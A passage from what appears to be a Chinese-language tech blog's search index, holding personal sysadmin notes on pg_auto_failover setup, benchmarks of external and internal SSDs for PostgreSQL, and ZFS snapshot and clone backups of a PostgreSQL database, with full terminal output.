17:30:58 [administrator@pg-slave ~]$ sudo supervisorctl status pgautofailover RUNNING pid 2232, uptime 0:00:04 2019-09-20 17:31:03 [administrator@pg-slave ~]$ sudo tail -30 /var/log/supervisor/pgautofailover-stdout---supervisor-LC_FG8.log 17:30:59 INFO Managing PostgreSQL installation at \u0026#34;/var/lib/postgresql/11/main\u0026#34; 17:30:59 INFO Found a stale pidfile at \u0026#34;/tmp/pg_autoctl/var/lib/postgresql/11/main/pg_autoctl.pid\u0026#34; 17:30:59 WARN Removing the stale pid file \u0026#34;/tmp/pg_autoctl/var/lib/postgresql/11/main/pg_autoctl.pid\u0026#34; 17:30:59 INFO The version of extenstion \u0026#34;pgautofailover\u0026#34; is \u0026#34;1.0\u0026#34; on the monitor 17:30:59 INFO pg_autoctl service is starting 17:30:59 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 320. 17:31:04 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 320. 17:31:09 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 320. 2019-09-20 17:31:13 [administrator@pg-slave ~]$ 搞定，收工！準備寫 ansible playbook！\nUPDATE\n新增用logrotate 來管理 pgautofailover logfile\nsudo vim /etc/logrotate.d/pgautofailover /var/log/supervisor/pgautofail*.log { daily rotate 7 copytruncate delaycompress # today and yesterday will not compress compress missingok notifempty } UPDATE\n當node 消失，需要手動在monitor上執行以下指令來移除node ，才能夠再次加入新的node\n2019-09-24 01:11:09 [administrator@monitor ~]$ sudo runuser -l postgres -c \u0026#34;psql postgres://autoctl_node@monitor:5432/pg_auto_failover\u0026#34; psql (11.5 (Ubuntu 11.5-1.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. pg_auto_failover=\u0026gt; select pgautofailover.remove_node(\u0026#39;pg-third\u0026#39;) pg_auto_failover-\u0026gt; ; remove_node ------------- t (1 row) pg_auto_failover=\u0026gt; ","date":"2019-09-20T10:17:17+08:00","permalink":"https://h.cowbay.org/post/pg_auto_failover_in_ubuntu_1804_psql_11/","title":"[筆記] 在ubuntu 18.04安裝psql 11 以及 pg_auto_failover / install psql 11 and pg_auto_failover in ubuntu 18.04"},{"content":"前幾天在淘寶上買了個 SSK 的USB 3.1 Gen2 (type-c) NVME SSD 外接盒 手邊也剛好有一條多的intel 600p nvme ssd 就順手來做個比較 目標是看看有沒有可能直接用外接的SSD來跑postgresql\n把600p 裝進去外接盒之後，就先來看一些簡單的資訊 不過沒想到用了幾個指令，都沒辦法辨別出正確的型號\nfdisk 沒有看到廠牌、型號\n2019-09-10 13:20:55 [minion@hqdc075 ~]$ sudo fdisk /dev/sdb Welcome to fdisk (util-linux 2.31.1). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Command (m for help): p Disk /dev/sdb: 238.5 GiB, 256060514304 bytes, 500118192 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 4096 bytes I/O size (minimum/optimal): 4096 bytes / 4096 bytes Disklabel type: dos Disk identifier: 0x59511d8e Device Boot Start End Sectors Size Id Type /dev/sdb1 2048 500118191 500116144 238.5G 83 Linux Command (m for help): q inxi 內接的intel ssd 有看到，不過外接的這顆SSD沒有model 可是可以看到序號 我在想這個序號應該是外接盒的序號，而不是SSD的？\n2019-09-10 13:21:51 [minion@hqdc075 ~]$ sudo inxi -Dxx Drives: HDD Total Size: 640.2GB (11.3% used) ID-1: /dev/nvme0n1 model: INTEL_SSDPEKKF256G7L size: 256.1GB serial: BTPYXXXXX firmware: 123P ID-2: USB /dev/sda model: SD/MMC size: 128.1GB serial: 201205XXXXXX-0:0 temp: 0C ID-3: USB /dev/sdb model: N/A size: 256.1GB serial: DF564XXXXXX:0 temp: 0C 2019-09-10 13:21:55 [minion@hqdc075 ~]$ dmesg 一樣，也是認不出 SSD ，但是有抓到外接盒\n[16622.930915] hub 4-0:1.0: USB hub found [16622.930926] hub 4-0:1.0: 2 ports detected [16623.372533] usb 4-1: new SuperSpeedPlus Gen 2 USB device number 2 using xhci_hcd [16623.393844] usb 4-1: New USB device found, idVendor=152d, idProduct=0562, bcdDevice= 2.04 [16623.393849] usb 4-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3 [16623.393853] usb 4-1: Product: SSK Storage [16623.393856] usb 4-1: Manufacturer: SSK [16623.393858] usb 4-1: SerialNumber: DF56419883B20 直接測試吧 不看型號了，直接測試吧！先切好分割、格式化，然後掛載到 /mnt，再用 dd 測試寫入 結果如下\n2019-09-10 13:24:03 [minion@hqdc075 ~]$ for i in {4,8,16,32,64,128,256,512,1024,2048,4096,8192,16384};do sudo dd if=/dev/zero of=/mnt/\u0026#34;$i\u0026#34;k bs=\u0026#34;$i\u0026#34;k count=1k;done 1024+0 records in 1024+0 records out 4194304 bytes (4.2 MB, 4.0 MiB) copied, 0.013719 s, 306 MB/s 1024+0 records in 1024+0 records out 8388608 bytes (8.4 MB, 8.0 MiB) copied, 0.0123268 s, 681 MB/s 1024+0 records in 1024+0 records out 16777216 bytes (17 MB, 16 MiB) copied, 0.0196891 s, 852 MB/s 1024+0 records in 1024+0 records out 33554432 bytes (34 MB, 32 MiB) copied, 0.0195221 s, 1.7 GB/s 1024+0 records in 1024+0 records out 67108864 bytes (67 MB, 64 MiB) copied, 0.0337692 s, 2.0 GB/s 1024+0 records in 1024+0 records out 134217728 bytes (134 MB, 128 MiB) copied, 0.0644939 s, 2.1 GB/s 1024+0 records in 1024+0 records out 268435456 bytes (268 MB, 256 MiB) copied, 0.131989 s, 2.0 GB/s 1024+0 records in 1024+0 records out 536870912 bytes (537 MB, 512 MiB) copied, 0.257682 s, 2.1 GB/s 1024+0 records in 1024+0 records out 1073741824 bytes (1.1 GB, 1.0 GiB) copied, 0.529154 s, 2.0 GB/s 1024+0 records in 1024+0 records out 2147483648 bytes (2.1 GB, 2.0 GiB) copied, 3.48498 s, 616 MB/s 1024+0 records in 1024+0 records out 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 7.36899 s, 583 MB/s 1024+0 records in 1024+0 records out 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 73.1975 s, 117 MB/s 1024+0 records in 1024+0 records out 17179869184 bytes (17 GB, 16 GiB) copied, 153.142 s, 112 MB/s 2019-09-10 13:28:58 [minion@hqdc075 ~]$ 可以發現，當寫入8G檔案的時候，速度開始急遽下降 翻了一下google 看到這張表格\nhttps://www.anandtech.com/show/10850/the-intel-ssd-600p-512gb-review\nintel 600p 256G 的SLC Cache 只有8.5GB 合理解釋了為什麼當寫入8G的檔案時，速度會掉那麼慘，跟SATA硬碟差不多了\n用iobench 測試看看 得到一樣的結論，8G左右，就會把cache塞暴，然後掉速\n2019-09-10 13:44:59 [changch@hqdc075 iobench]$ sudo ./iobench.sh --sync --dir /mnt --megabytes 8192 Target directory: /mnt Testfile size: 8192 x 1 Megabyte 1. Write benchmark without cache 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 36.8695 s, 233 MB/s 2. Write benchmark with cache 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 64.1573 s, 134 MB/s 3. Read benchmark with dropped cache 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 9.21821 s, 932 MB/s 4. Read benchmark without cache drop Start 1 of 5... 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 1.02253 s, 8.4 GB/s Start 2 of 5... 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 0.832002 s, 10.3 GB/s Start 3 of 5... 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 0.81194 s, 10.6 GB/s Start 4 of 5... 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 0.821035 s, 10.5 GB/s Start 5 of 5... 8589934592 bytes (8.6 GB, 8.0 GiB) copied, 0.808803 s, 10.6 GB/s Done. 2019-09-10 13:47:40 [changch@hqdc075 iobench]$ 那如果不用8G的檔案大小來測試呢？看起來是比較正常一點\n2019-09-10 13:47:40 [changch@hqdc075 iobench]$ sudo ./iobench.sh --sync --dir /mnt --megabytes 4096 Target directory: /mnt Testfile size: 4096 x 1 Megabyte 1. Write benchmark without cache 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 7.55296 s, 569 MB/s 2. Write benchmark with cache 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 20.6237 s, 208 MB/s 3. Read benchmark with dropped cache 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 4.63622 s, 926 MB/s 4. Read benchmark without cache drop Start 1 of 5... 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 0.518597 s, 8.3 GB/s Start 2 of 5... 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 0.436877 s, 9.8 GB/s Start 3 of 5... 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 0.437854 s, 9.8 GB/s Start 4 of 5... 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 0.420224 s, 10.2 GB/s Start 5 of 5... 4294967296 bytes (4.3 GB, 4.0 GiB) copied, 0.431023 s, 10.0 GB/s Done. 2019-09-10 13:50:09 [changch@hqdc075 iobench]$ 跑看看pgbench ?? 試試看這次的目標，用 external nvme ssd 跑資料庫，會不會跟放在本機的PCI-E SSD 有所差距？\ndata_directory in internal pcie-ssd initialize pgbench database\n2019-09-10 13:52:35 [minion@hqdc075 ~]$ sudo su - postgres postgres@hqdc075:~$ createdb pgbench postgres@hqdc075:~$ pgbench -i -U postgres -s 10 pgbench NOTICE: table \u0026#34;pgbench_history\u0026#34; does not exist, skipping NOTICE: table \u0026#34;pgbench_tellers\u0026#34; does not exist, skipping NOTICE: table \u0026#34;pgbench_accounts\u0026#34; does not exist, skipping NOTICE: table \u0026#34;pgbench_branches\u0026#34; does not exist, skipping creating tables... 100000 of 1000000 tuples (10%) done (elapsed 0.08 s, remaining 0.70 s) 200000 of 1000000 tuples (20%) done (elapsed 0.19 s, remaining 0.75 s) 300000 of 1000000 tuples (30%) done (elapsed 0.36 s, remaining 0.83 s) 400000 of 1000000 tuples (40%) done (elapsed 0.49 s, remaining 0.73 s) 500000 of 1000000 tuples (50%) done (elapsed 0.58 s, remaining 0.58 s) 600000 of 1000000 tuples (60%) done (elapsed 0.75 s, remaining 0.50 s) 700000 of 1000000 tuples (70%) done (elapsed 0.89 s, remaining 0.38 s) 800000 of 1000000 tuples (80%) done (elapsed 0.99 s, remaining 0.25 s) 900000 of 1000000 tuples (90%) done (elapsed 1.11 s, remaining 0.12 s) 1000000 of 1000000 tuples (100%) done (elapsed 1.27 s, remaining 0.00 s) vacuum... set primary keys... done. run pgbench\npostgres@hqdc075:~$ pgbench -t 10 -c 100 -S -U postgres pgbench starting vacuum...end. transaction type: \u0026lt;builtin: select only\u0026gt; scaling factor: 10 query mode: simple number of clients: 100 number of threads: 1 number of transactions per client: 10 number of transactions actually processed: 1000/1000 latency average = 32.118 ms tps = 3113.559459 (including connections establishing) tps = 3135.056341 (excluding connections establishing) postgres@hqdc075:~$ pgbench -t 1000 -c 100 -S -U postgres pgbench starting vacuum...end. transaction type: \u0026lt;builtin: select only\u0026gt; scaling factor: 10 query mode: simple number of clients: 100 number of threads: 1 number of transactions per client: 1000 number of transactions actually processed: 100000/100000 latency average = 3.753 ms tps = 26643.223990 (including connections establishing) tps = 26659.061459 (excluding connections establishing) data_directory in external NVME SSD initialize pgbench database\npostgres@hqdc075:~$ pgbench -i -U postgres -s 10 pgbench creating tables... 100000 of 1000000 tuples (10%) done (elapsed 0.08 s, remaining 0.70 s) 200000 of 1000000 tuples (20%) done (elapsed 0.19 s, remaining 0.76 s) 300000 of 1000000 tuples (30%) done (elapsed 0.35 s, remaining 0.81 s) 400000 of 1000000 tuples (40%) done (elapsed 0.49 s, remaining 0.74 s) 500000 of 1000000 tuples (50%) done (elapsed 0.60 s, remaining 0.60 s) 600000 of 1000000 tuples (60%) done (elapsed 0.76 s, remaining 0.51 s) 700000 of 1000000 tuples (70%) done (elapsed 0.89 s, remaining 0.38 s) 800000 of 1000000 tuples (80%) done (elapsed 1.01 s, remaining 0.25 s) 900000 of 1000000 tuples (90%) done (elapsed 1.15 s, remaining 0.13 s) 1000000 of 1000000 tuples (100%) done (elapsed 1.32 s, remaining 0.00 s) vacuum... set primary keys... done. run pgbench 可以看到兩邊的結果其實是差不多的，作為資料庫備份是一定沒有問題 至於能不能直接作為資料庫空間使用？我想也許可以嘗試看看..\npostgres@hqdc075:~$ pgbench -t 10 -c 100 -S -U postgres pgbench starting vacuum...end. transaction type: \u0026lt;builtin: select only\u0026gt; scaling factor: 10 query mode: simple number of clients: 100 number of threads: 1 number of transactions per client: 10 number of transactions actually processed: 1000/1000 latency average = 32.998 ms tps = 3030.531670 (including connections establishing) tps = 3051.744292 (excluding connections establishing) postgres@hqdc075:~$ pgbench -t 1000 -c 100 -S -U postgres pgbench starting vacuum...end. transaction type: \u0026lt;builtin: select only\u0026gt; scaling factor: 10 query mode: simple number of clients: 100 number of threads: 1 number of transactions per client: 1000 number of transactions actually processed: 100000/100000 latency average = 3.758 ms tps = 26610.771423 (including connections establishing) tps = 26626.871871 (excluding connections establishing) postgres@hqdc075:~$ update:\n剛剛看了一下，發現這樣只有測試到 read (select only) 或許要找找看其他的測試方法\n接下來直接用 restore 測試\n#### restore 5G database with external nvme ssd postgres@hqdc075:~$ createdb demo postgres@hqdc075:~$ time psql demo \u0026lt; /tmp/demo.sql SET ... ALTER TABLE real\t4m1.184s user\t0m2.894s sys\t0m0.504s postgres@hqdc075:~$ restore 5G database with internal pci-e nvme ssd postgres@hqdc075:~$ dropdb demo postgres@hqdc075:~$ createdb demo postgres@hqdc075:~$ time psql demo \u0026lt; /tmp/demo.sql SET ... ALTER TABLE real\t4m1.636s user\t0m2.909s sys\t0m0.612s postgres@hqdc075:~$ 看起來是沒有什麼區別，那如果是外接的 SATA SSD呢？\ndmesg 看得到型號耶..\n[23995.478928] usb 2-4: new SuperSpeed Gen 1 USB device number 3 using xhci_hcd [23995.506134] usb 2-4: New USB device found, idVendor=2109, idProduct=0715, bcdDevice= 3.36 [23995.506141] usb 2-4: New USB device strings: Mfr=1, Product=2, SerialNumber=3 [23995.506145] usb 2-4: Product: 30848 [23995.506149] usb 2-4: Manufacturer: Ugreen [23995.506153] usb 2-4: SerialNumber: 00000012526D [23995.512813] scsi host2: uas [23995.530161] scsi 2:0:0:0: Direct-Access SanDisk SDSSDXP240G R131 PQ: 0 ANSI: 6 [23995.531948] sd 2:0:0:0: Attached scsi generic sg2 type 0 [23995.533820] sd 2:0:0:0: [sdc] 468862128 512-byte logical blocks: (240 GB/224 GiB) [23995.533986] sd 2:0:0:0: [sdc] Write Protect is off [23995.533992] sd 2:0:0:0: [sdc] Mode Sense: 2f 00 00 00 [23995.534402] sd 2:0:0:0: [sdc] Write cache: enabled, read cache: enabled, doesn\u0026#39;t support DPO or FUA [23995.534844] sd 2:0:0:0: [sdc] Optimal transfer size 33553920 bytes [23995.540806] sdc: [23995.544089] sd 2:0:0:0: [sdc] Attached SCSI disk 2019-09-10 14:24:54 [minion@hqdc075 ~]$ restore 5G database with external sata SSD\n很意外的，速度居然還是差不多？？\npostgres@hqdc075:~$ createdb demo postgres@hqdc075:~$ time psql demo \u0026lt; /tmp/demo.sql SET ... ALTER TABLE real\t4m9.950s user\t0m2.752s sys\t0m0.640s postgres@hqdc075:~$ run pgebnech\n這個差很多了，tps 從前面的 26000 掉到剩下 2800 ，差十倍左右！\npostgres@hqdc075:~$ pgbench -t 10 -c 100 -S -U postgres pgbench starting vacuum...end. transaction type: \u0026lt;builtin: select only\u0026gt; scaling factor: 10 query mode: simple number of clients: 100 number of threads: 1 number of transactions per client: 10 number of transactions actually processed: 1000/1000 latency average = 35.267 ms tps = 2835.526770 (including connections establishing) tps = 2855.642604 (excluding connections establishing) postgres@hqdc075:~$ 疑問：\n什麼原因會讓外接/內建 nvme ssd 和外接SATA SSD 在 restore db時，花了差不多時間，但是 tps 差異那麼大呢？ 這樣測試，似乎沒有真正測出外接nvme ssd 跑資料庫時候的效能？ ","date":"2019-09-10T14:37:09+08:00","permalink":"https://h.cowbay.org/post/bencmark-with-external-internal-nvme-ssd-and-external-sata-ssd/","title":"[筆記] 測試 USB 3.1 Gen2 NVME SSD 外接盒 \u0026 內建pci-e ssd \u0026 外接SATA SSD / Bencmark With External Internal Nvme Ssd and External Sata Ssd"},{"content":"前面測試了用pgbarman / pgbackrest 來備份 postgresql\n這次改從system file level 來下手\n採用zfs 的快照來備份、還原postgresql 資料庫\n建立測試資料庫、TABLE、snapshot 資料庫現況 只有系統預設的DB，沒有其他多的東西\npostgres@hqdc034:~$ psql -c \u0026#39;\\l\u0026#39; List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+-------------+-------------+----------------------- postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres (3 rows) postgres@hqdc034:~$ du -sh /zp/database/10/main/ 232M\t/zp/database/10/main/ 建立第一次的快照 2019-09-06 09:03:46 [changch@hqdc034 ~]$ sudo zfs list -t snapshot no datasets available 2019-09-06 09:03:53 [changch@hqdc034 ~]$ sudo zfs snapshot zp/database@init_db_no_demo 2019-09-06 09:04:09 [changch@hqdc034 ~]$ sudo zfs list -t snapshot NAME USED AVAIL REFER MOUNTPOINT zp/database@init_db_no_demo 0 - 231M - 2019-09-06 09:04:15 [changch@hqdc034 ~]$ 建立、倒回測試資料庫 demo postgres@hqdc034:~$ createdb demo postgres@hqdc034:~$ psql demo \u0026lt; /home/changch/Downloads/demo.sql SET SET 略... 再檢查一次資料庫的狀況，看到 demo DB出現了，資料庫目錄也變大了\npostgres@hqdc034:~$ psql -c \u0026#39;\\l\u0026#39; List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+----------+-------------+-------------+----------------------- demo | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | postgres | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | template0 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | UTF8 | en_US.UTF-8 | en_US.UTF-8 | =c/postgres + | | | | | postgres=CTc/postgres (4 rows) postgres@hqdc034:~$ du -sh /zp/database/10/main/ 2.1G\t/zp/database/10/main/ postgres@hqdc034:~$ 建立第二次快照 這次的快照，將包含剛剛倒回的 demo DB，但是不包含等下才要建立的測試 table\n2019-09-06 09:16:01 [changch@hqdc034 ~]$ sudo zfs list -t snapshot NAME USED AVAIL REFER MOUNTPOINT zp/database@init_db_no_demo 250K - 231M - zp/database@demo_db_just_restore 0 - 2.08G - 2019-09-06 09:16:04 [changch@hqdc034 ~]$ 建立測試 table postgres@hqdc034:~$ psql -c \u0026#39;create table test ( a int, b varchar(50) );\u0026#39; CREATE TABLE postgres@hqdc034:~$ 建立第三次快照 這次快照，只有建立 test table ，但是裡面沒有資料\n2019-09-06 09:18:34 [changch@hqdc034 ~]$ sudo zfs list -t snapshot NAME USED AVAIL REFER MOUNTPOINT zp/database@init_db_no_demo 250K - 231M - zp/database@demo_db_just_restore 138K - 2.08G - zp/database@demo_db_create_test_table_but_no_data 0 - 2.08G - 2019-09-06 09:18:36 [changch@hqdc034 ~]$ 在test table 插入100萬筆資料 postgres@hqdc034:~$ psql -c \u0026#39;with aa as ( select * from generate_series (1,1000000) a ) insert into test select aa.a, md5(aa.a::varchar) from aa;\u0026#39; INSERT 0 1000000 postgres@hqdc034:~$ psql -c \u0026#39;select count(*) from test;\u0026#39; count --------- 1000000 (1 row) postgres@hqdc034:~$ 建立第四次快照 test table 內有 1000000 筆資料\n2019-09-06 09:18:36 [changch@hqdc034 ~]$ sudo zfs snapshot zp/database@demo_db_test_table_with_1M_rows 2019-09-06 09:21:08 [changch@hqdc034 ~]$ sudo zfs list -t snapshot NAME USED AVAIL REFER MOUNTPOINT zp/database@init_db_no_demo 250K - 231M - zp/database@demo_db_just_restore 138K - 2.08G - zp/database@demo_db_create_test_table_but_no_data 116K - 2.08G - zp/database@demo_db_test_table_with_1M_rows 0 - 2.15G - 2019-09-06 09:21:09 [changch@hqdc034 ~]$ 再次插入 100萬筆資料 postgres@hqdc034:~$ time psql -c \u0026#39;with aa as ( select * from generate_series (1,1000000) a ) insert into test select aa.a, md5(aa.a::varchar) from aa;\u0026#39; INSERT 0 1000000 real\t0m4.276s user\t0m0.020s sys\t0m0.012s postgres@hqdc034:~$ psql -c \u0026#39;select count(*) from test;\u0026#39; count --------- 2000000 (1 row) postgres@hqdc034:~$ 建立第五次快照 現在 test table 有 200萬筆資料了\n2019-09-06 09:21:09 [changch@hqdc034 ~]$ sudo zfs snapshot zp/database@demo_db_test_table_with_2M_rows 2019-09-06 09:22:29 [changch@hqdc034 ~]$ sudo zfs list -t snapshot NAME USED AVAIL REFER MOUNTPOINT zp/database@init_db_no_demo 250K - 231M - zp/database@demo_db_just_restore 138K - 2.08G - zp/database@demo_db_create_test_table_but_no_data 116K - 2.08G - zp/database@demo_db_test_table_with_1M_rows 218K - 2.15G - zp/database@demo_db_test_table_with_2M_rows 0 - 2.23G - 2019-09-06 09:22:30 [changch@hqdc034 ~]$ 玩大點，直接湊滿1000萬筆資料好了 postgres@hqdc034:~$ time psql -c \u0026#39;with aa as ( select * from generate_series (1,8000000) a ) insert into test select aa.a, md5(aa.a::varchar) from aa;\u0026#39; INSERT 0 8000000 real\t0m32.172s user\t0m0.024s sys\t0m0.008s postgres@hqdc034:~$ psql -c \u0026#39;select count(*) from test;\u0026#39; count ---------- 10000000 (1 row) postgres@hqdc034:~$ 建立第六次快照 10M rows in test table\n2019-09-06 09:22:30 [changch@hqdc034 ~]$ sudo zfs snapshot zp/database@demo_db_test_table_with_10M_rows 2019-09-06 09:25:18 [changch@hqdc034 ~]$ sudo zfs list -t snapshot NAME USED AVAIL REFER MOUNTPOINT zp/database@init_db_no_demo 250K - 231M - zp/database@demo_db_just_restore 138K - 2.08G - zp/database@demo_db_create_test_table_but_no_data 116K - 2.08G - zp/database@demo_db_test_table_with_1M_rows 218K - 2.15G - zp/database@demo_db_test_table_with_2M_rows 530K - 2.23G - zp/database@demo_db_test_table_with_10M_rows 163K - 2.97G - 2019-09-06 09:25:21 [changch@hqdc034 ~]$ 到1000萬筆資料為止，現在資料庫大小是這樣\npostgres@hqdc034:~$ du -sh /zp/database/10/main/ 3.0G\t/zp/database/10/main/ postgres@hqdc034:~$ 還原測試 最後一次做快照的時候，demo DB 裡面有一千萬筆資料，現在來砍掉500萬筆\npostgres@hqdc034:~$ time psql -c \u0026#39;delete from test where a \u0026gt; 5000000;\u0026#39; DELETE 3000000 real\t0m7.844s user\t0m0.024s sys\t0m0.004s postgres@hqdc034:~$ time psql -c \u0026#39;select count(*) from test;\u0026#39; count --------- 7000000 (1 row) real\t0m0.268s user\t0m0.024s sys\t0m0.004s postgres@hqdc034:~$ 咦，怪怪的，為什麼只有砍掉300萬筆？ 好，這邊先不管，等等正好來驗證restore的狀況\n假設剛剛這個刪除是錯誤的動作，我要回到1000萬資料的狀態，就可以用zfs rollback 來達成\n第一次還原 目標是還原到包含1000萬筆資料的狀態(現在是700萬筆)\n2019-09-06 09:25:21 [changch@hqdc034 ~]$ sudo service postgresql stop * Stopping PostgreSQL 10 database server [ OK ] 2019-09-06 10:14:12 [changch@hqdc034 ~]$ sudo zfs rollback -r zp/database@demo_db_test_table_with_10M_rows 2019-09-06 10:14:28 [changch@hqdc034 ~]$ sudo service postgresql start * Starting PostgreSQL 10 database server [ OK ] 2019-09-06 10:14:57 [changch@hqdc034 ~]$ 檢查一下\npostgres@hqdc034:~$ time psql -c \u0026#39;select count(*) from test;\u0026#39; count ---------- 10000000 (1 row) real\t0m5.019s user\t0m0.040s sys\t0m0.008s postgres@hqdc034:~$ 沒錯，又回到1000萬筆資料的狀態了\n要注意的是，如果回到更之前的狀態，在該狀態之後的快照將會被清除，除非你先做clone 比如我現在要回到 200萬筆的狀態，那1000萬筆資料的快照就會被刪除\n2019-09-06 10:17:32 [changch@hqdc034 ~]$ sudo service postgresql stop * Stopping PostgreSQL 10 database server [ OK ] 2019-09-06 10:18:50 [changch@hqdc034 ~]$ sudo zfs rollback -r zp/database@demo_db_test_table_with_2M_rows 2019-09-06 10:18:57 [changch@hqdc034 ~]$ sudo zfs list -t snapshot NAME USED AVAIL REFER MOUNTPOINT zp/database@init_db_no_demo 250K - 231M - zp/database@demo_db_just_restore 138K - 2.08G - zp/database@demo_db_create_test_table_but_no_data 116K - 2.08G - zp/database@demo_db_test_table_with_1M_rows 218K - 2.15G - zp/database@demo_db_test_table_with_2M_rows 0 - 2.23G - 2019-09-06 10:19:04 [changch@hqdc034 ~]$ sudo service postgresql start * Starting PostgreSQL 10 database server [ OK ] 2019-09-06 10:19:17 [changch@hqdc034 ~]$ postgres@hqdc034:~$ time psql -c \u0026#39;select count(*) from test;\u0026#39; count --------- 2000000 (1 row) real\t0m0.175s user\t0m0.024s sys\t0m0.008s postgres@hqdc034:~$ 啊，我剛剛應該先clone的\u0026hellip;. 沒關係，我們再做一次，新增800萬筆資料，湊齊1000萬筆，然後快照\npostgres@hqdc034:~$ time psql -c \u0026#39;with aa as ( select * from generate_series (1,8000000) a ) insert into test select aa.a, md5(aa.a::varchar) from aa;\u0026#39; INSERT 0 8000000 real\t0m35.662s user\t0m0.048s sys\t0m0.004s postgres@hqdc034:~$ time psql -c \u0026#39;select count(*) from test;\u0026#39; count ---------- 10000000 (1 row) real\t0m5.259s user\t0m0.024s sys\t0m0.008s postgres@hqdc034:~$ 做快照\n2019-09-06 10:19:17 [changch@hqdc034 ~]$ sudo zfs snapshot zp/database@demo_db_test_table_with_10M_rows 2019-09-06 10:22:59 [changch@hqdc034 ~]$ sudo zfs list -t snapshot NAME USED AVAIL REFER MOUNTPOINT zp/database@init_db_no_demo 250K - 231M - zp/database@demo_db_just_restore 138K - 2.08G - zp/database@demo_db_create_test_table_but_no_data 116K - 2.08G - zp/database@demo_db_test_table_with_1M_rows 218K - 2.15G - zp/database@demo_db_test_table_with_2M_rows 56.4M - 2.23G - zp/database@demo_db_test_table_with_10M_rows 0 - 1.81G - 2019-09-06 10:23:02 [changch@hqdc034 ~]$ 接著來測試看看 clone snapshot，這是基本的說明\nClones can only be created from a snapshot and a snapshot can not be deleted until you delete the clone that is based on this snapshot. To create a clone, use the zfs clone command. clone 會做出一份跟clone來源一模一樣的資料，在快照模式下，資料是唯讀的，clone出來後，就可以做異動。但是不能刪除clone來源的快照，會提示錯誤。\n2019-09-06 10:28:31 [changch@hqdc034 ~]$ sudo zfs clone zp/database@demo_db_test_table_with_10M_rows zp/database/clone_with_10M_rows 2019-09-06 10:29:21 [changch@hqdc034 ~]$ sudo zfs list NAME USED AVAIL REFER MOUNTPOINT zp 3.08G 231G 22K /zp zp/database 3.08G 231G 1.88G /zp/database zp/database/clone_with_10M_rows 0 231G 1.81G /zp/database/clone_with_10M_rows 2019-09-06 10:29:26 [changch@hqdc034 ~]$ 可以看到做了clone之後，多了一個 zfs dataset 試試看把資料庫路徑直接改到這個新做的dataset 看看能不能啟動資料庫 修改 /etc/postgresql/10/main/postgresql.conf，然後重起postgresql\n#data_directory = \u0026#39;/var/lib/postgresql/10/main\u0026#39; # use data in another directory #data_directory = \u0026#39;/zp/database/10/main\u0026#39; data_directory = \u0026#39;/zp/database/clone_with_10M_rows/10/main\u0026#39; 啟動有比較久一點 而且好像沒成功啟動\n2019-09-06 10:32:27 [changch@hqdc034 ~]$ sudo service postgresql restart * Restarting PostgreSQL 10 database server [ OK ] 2019-09-06 10:33:37 [changch@hqdc034 ~]$ 2019-09-06 10:33:37 [changch@hqdc034 ~]$ sudo netstat -antlp |grep 5432 而且在 syslog \u0026amp; postgresql log 中看不到什麼異常，怪了！ 而且再啟動一次就好了？\n再來測試一次看看\n2019-09-06 10:37:22 [changch@hqdc034 ~]$ sudo service postgresql stop * Stopping PostgreSQL 10 database server [ OK ] 2019-09-06 10:38:03 [changch@hqdc034 ~]$ sudo zfs list NAME USED AVAIL REFER MOUNTPOINT zp 3.24G 231G 22K /zp zp/database 3.24G 231G 1.88G /zp/database zp/database/clone_with_10M_rows 165M 231G 1.88G /zp/database/clone_with_10M_rows 2019-09-06 10:38:13 [changch@hqdc034 ~]$ sudo zfs destroy zp/database/clone_with_10M_rows 2019-09-06 10:38:21 [changch@hqdc034 ~]$ sudo zfs clone zp/database@demo_db_test_table_with_10M_rows zp/database/clone_with_10M_rows 2019-09-06 10:38:32 [changch@hqdc034 ~]$ sudo zfs list NAME USED AVAIL REFER MOUNTPOINT zp 3.08G 231G 22K /zp zp/database 3.08G 231G 1.88G /zp/database zp/database/clone_with_10M_rows 0 231G 1.81G /zp/database/clone_with_10M_rows 2019-09-06 10:38:35 [changch@hqdc034 ~]$ sudo service postgresql start^C 2019-09-06 10:38:44 [changch@hqdc034 ~]$ sudo zfs list NAME USED AVAIL REFER MOUNTPOINT zp 3.08G 231G 22K /zp zp/database 3.08G 231G 1.88G /zp/database zp/database/clone_with_10M_rows 0 231G 1.81G /zp/database/clone_with_10M_rows 2019-09-06 10:38:45 [changch@hqdc034 ~]$ sudo service postgresql start * Starting PostgreSQL 10 database server [ OK ] 2019-09-06 10:39:04 [changch@hqdc034 ~]$ netstat -antlp |grep 5432 (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) tcp 0 0 